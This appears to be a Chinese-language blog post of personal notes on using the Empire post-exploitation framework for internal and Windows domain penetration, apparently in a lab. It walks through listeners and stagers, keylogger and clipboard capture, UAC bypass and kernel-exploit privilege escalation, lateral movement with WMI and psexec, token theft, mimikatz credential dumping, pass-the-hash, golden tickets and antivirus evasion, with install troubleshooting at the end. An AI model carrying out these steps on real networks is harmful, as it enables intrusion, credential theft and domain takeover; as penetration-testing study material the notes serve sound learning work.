---
title: Empire
date: 2020-11-15 23:26:52
tags:
---

# Empire 内网渗透神器

# 一 基本渗透

安装

```
git clone https://github.com/BC-SECURITY/Empire/
./setup/install.sh
启动
 ./empire
```

![image-20201115233416777](https://i.loli.net/2020/12/27/xA98gFHrjvIiLPu.png)

```
目前加载的模块 285
监听器  
当前活动代理 可以理解当前会话
```

```
lisenter 进入监听器模块
uselistener + tab键可以查看有多少个监听器 然后就可以选项
info 查看描述 查看哪些是必须要设置的选项
set + name + what 将name设置为what
在设置host的时候需要加上端口号
execute 开始执行
list 查看有多少个监听器
kill 删除监听器
```

```
usestager 设置payload
sysinfo 查看系统信息
help agents 查看简单的终端命令
sc 截图命令
```

```
interact 选择当前的一个会话
```

模块命令

```
sc截图命令
searchmodule   搜索模块
usemodule 使用模块
code_execution代码执行
collection收集浏览器、剪切板、keepass、文件浏览记录等信息
credentials密码凭据的获取和转储
exfiltration信息渗出
exploitation漏洞溢出
lateral_movement横向运动移动
management用来执行些系统设置，和邮件信息的收集
persistence权限维持
privesc本机权限提升
recon侦察
situational_awareness评估主机运行环境，网络运行环境
trollsploit恶作剧
```

 使用键盘记录模块

usemodule collection/keylogger

剪切板

collection/clipboard_monitor

## 二、常用模块的使用

1.主机发现

```
rename 重命名
sysinfo 查看系统信息
```

```
使用模块 
usemode situational_awareness/network/
这里有多个扫描的模块可以使用
smb扫描
network/smbscanner 需要登陆的账号和密码
```

2.端口扫描

usemodule situational_awareness/network/portscan

设置各个参数即可

3.查找本地管理员的主机**

situational_awareness/network/powerview/find_localadmin_access

直接执行

**4．** **查看共享文件**

situational_awareness/network/powerview/share_finder

5. **本地信息**收集*

situational_awareness/host/winenum

**6．** **提权**

bypassuac

privesc/bypassuac

扫描环境向量提权 privesc/powerup/allchecks

**计划任务system提权**

persistence/elevated/schtasks

set Listener test

`用户名的名字必须是存在的` 设置dailytime

溢出提权漏洞

powershell/privesc/ms16-032

powershell/privesc/ms16-135

# 三、域内渗透

```
shell whoami /groups 查看权限
用基本的命令查询本地的信息
sysinfo
whoami
info
arp扫描
situational_awareness/network/arpscan
查找本地管理员
situational_awareness/network/powerview/find_localadmin_access
moonsec这个用户是否是域内某一台主机的本地管理员


查看内网的主机，查找那台机器是本地管理员，进行本地的端口和arp扫描，查询内网的受信任关系
```

确定是否能访问 database2的c盘

![image-20201118235013869](https://i.loli.net/2020/12/27/uqUnw2z8pRsPgVX.png)

查找域控

situational_awareness/network/powerview/get_domain_controller

![image-20201118235023811](https://i.loli.net/2020/12/27/LpYmTa57rRfZMHv.png)

会话注入

lateral_movement/invoke_wmi

lateral_movement/invoke_psexec

通过invoke_wmi 或者 psexe模块 拿到database2的权限

lateral_movement/invoke_wmi

设置好监听器和计算机名用execute执行

![image-20201119000306908](https://i.loli.net/2020/12/27/Es76i8A5mGJjQDt.png)

`invoke_wmi 系统自带`

`psexec 留下记录`

`lateral_movement/invoke_psexec`

`获取系统权限`

命令token窃取 

窃取之后就有dc的访问权限

ps 查询进程是否有域内超级管理员

恢复原来身份可以用

revtoself

凭证获取

mimikatz

当前的权限为1 我们就可以用mimikatz 这个命令 获取明文 还有用户的一些凭证。

```
我们获取之后可以用一个creds命令 查询用户凭证信息
将获取到的凭证信息保存到一个文件中
```

**三种方法继续进行权限的提升**（基于凭证信息的获取）

1.usemodule use lateral_movement/invoke_wmi

```
填写的数据
Listener  
Credid creds中的id
ComputerName 电脑的名字
```

![image-20201119001928603](https://i.loli.net/2020/12/27/TIhagtmxqSWGYMV.png)

2. 制作pth

   pth + 获取·到的clientid 就可以制作假身份了哈哈。

3. 制作黄金

   credentials/mimikatz/lsadump 获取到krtbtgt 哈希

   credentials/mimikatz/golden_ticket

   set credid 4

   set user Administrator

   execute
   
# 四、会话管理

**重启之后，所有的会话都会被清理掉**

   spawn 进行派生会话

​    psinject 注入进程

`psinject 进程号 监听器`

## 和meatsploit进行联动

使用`code_execution/invoke_shellcode`

这个模块 Lhost设置metasploit的ip地址 lport 设置的端口

payloady 跟metasploit 相对应。

# 五、过免杀

 usestager windows/csharp_exe

![image-20201119211845849](https://i.loli.net/2020/12/27/7nKGrHxIad4MWmc.png)



踩坑记录：

```
git clone https://github.com/EmpireProject/Empire.git
cd Empire
cd setup
sudo ./install.sh

然后开始报错
```

```
NomodulenamedCrypto.Cipher
pip install Crypto
pip install pycryptodome
```

```
#报错1：ImportError: No module named M2Crypto
root@kali:~/Empire/setup# pip install https://gitlab.com/m2crypto/m2crypto/-/archive/master/m2crypto-master.tar.gz
root@kali:~/Empire/setup# ./reset.sh 

#报错2：ImportError: No module named xlrd
root@kali:~/Empire/setup# pip install xlrd
root@kali:~/Empire/setup# ./reset.sh 

#报错3：ImportError: No module named xlutils.copy
root@kali:~/Empire/setup# pip install xlutils
root@kali:~/Empire/setup# ./reset.sh 

#报错4：ImportError: No module named pyminifier
root@kali:~/Empire/setup# pip install pyminifier
root@kali:~/Empire/setup# ./reset.sh 
复制代码
```

```
然后就是换源
```

